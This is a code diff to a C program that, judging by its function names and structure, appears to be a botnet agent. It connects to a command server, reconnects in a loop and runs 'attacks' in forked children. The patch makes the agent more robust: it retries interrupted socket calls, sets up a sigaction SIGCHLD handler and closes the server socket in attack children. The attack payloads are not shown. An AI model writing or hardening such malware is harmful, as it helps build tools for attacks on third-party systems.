@@ -15,6 +15,7 @@
 
 static volatile int g_child_pid = 0;
 static volatile int g_attack_running = 0;
+static int g_server_sock = -1;
 
 static void get_arch_string(char *buf, int buflen) {
     struct utsname u;
@@ -86,7 +87,11 @@ static int send_line(int sock, const char *fmt, ...) {
         int sent = 0;
         while (sent < n) {
             int r = send(sock, buf + sent, n - sent, MSG_NOSIGNAL);
-            if (r <= 0) return -1;
+            if (r < 0) {
+                if (errno == EINTR) continue;
+                return -1;
+            }
+            if (r == 0) return -1;
             sent += r;
         }
     }
@@ -98,7 +103,11 @@ static int recv_line(int sock, char *buf, int buflen) {
     while (pos < buflen - 1) {
         char c;
         int r = recv(sock, &c, 1, 0);
-        if (r <= 0) return -1;
+        if (r < 0) {
+            if (errno == EINTR) continue;
+            return -1;
+        }
+        if (r == 0) return -1;
         if (c == '\n') break;
         if (c != '\r') buf[pos++] = c;
     }
@@ -158,6 +167,9 @@ static void execute_attack(int argc, char **argv) {
     if (pid < 0) return;
 
     if (pid == 0) {
+        if (g_server_sock >= 0) close(g_server_sock);
+        signal(SIGCHLD, SIG_DFL);
+        signal(SIGPIPE, SIG_DFL);
         run_attack_in_child(argc, argv);
         _exit(0);
     } else {
@@ -454,7 +466,12 @@ int main(int argc, char *argv[]) {
     if (argc >= 2) server_host = argv[1];
     if (argc >= 3) server_port = atoi(argv[2]);
 
-    signal(SIGCHLD, sigchld_handler);
+    struct sigaction sa;
+    memset(&sa, 0, sizeof(sa));
+    sa.sa_handler = sigchld_handler;
+    sigemptyset(&sa.sa_mask);
+    sa.sa_flags = SA_RESTART | SA_NOCLDSTOP;
+    sigaction(SIGCHLD, &sa, NULL);
     signal(SIGPIPE, SIG_IGN);
 
     srand(time(NULL) ^ getpid());
@@ -467,6 +484,7 @@ int main(int argc, char *argv[]) {
 
     while (1) {
         int sock = connect_to_server(server_host, server_port);
+        g_server_sock = sock;
         if (sock < 0) {
             sleep(RECONNECT_DELAY);
             continue;
